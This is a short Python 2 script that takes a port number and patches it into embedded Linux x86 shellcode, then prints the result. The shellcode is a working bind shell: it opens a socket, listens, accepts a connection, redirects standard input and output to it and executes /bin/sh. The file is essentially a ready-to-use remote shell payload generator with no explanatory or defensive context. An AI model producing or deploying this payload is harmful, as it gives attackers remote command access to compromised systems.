#!/usr/bin/env python

import sys, socket;

shellcode=("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\xb0\x66\xb3\x01\xb1\x02\x53\x51\x8d\x0c\x24\xcd\x80\x59\x5b\x66\x68\x15\xb3\x66\x51\x89\xe1\xb2\x10\x52\x51\x50\x92\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x50\x52\xb0\x66\xb3\x04\x89\xe1\x89\xc2\xcd\x80\x92\x5f\x52\x57\x43\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80");

if (len(sys.argv) != 2):
	print "usage python change_port.py <port_number>"
	sys.exit(-1)

port = int(sys.argv[1])

if port < 1024 or port > 65535:
    print "invalid port number"
    sys.exit(-1)

no_port = socket.htons(port);
hex_no_port = "{0:#0{1}x}".format(no_port,6)

h1 = hex_no_port[2:4]
h2 = hex_no_port[4:6]

if h1 == "":
    h1 = "00"

if len(h1) == 1:
    h1 = "0" + h1

if h2 == "":
    h2 = "00"

if len(h2) == 1:
    h2 = "0" + h2

new_shellcode = "\""
count = 0

for x in bytearray(shellcode):
	
	new_shellcode += '\\x'
	
	if(count == 26):
		new_shellcode += h2
	elif(count == 27):
		new_shellcode += h1
	else:
		number = str(hex(x))
		number = number[2:]
		if len(number) == 1:
			number = "0" + number
		new_shellcode += number
	
	count += 1

new_shellcode += "\""

print new_shellcode






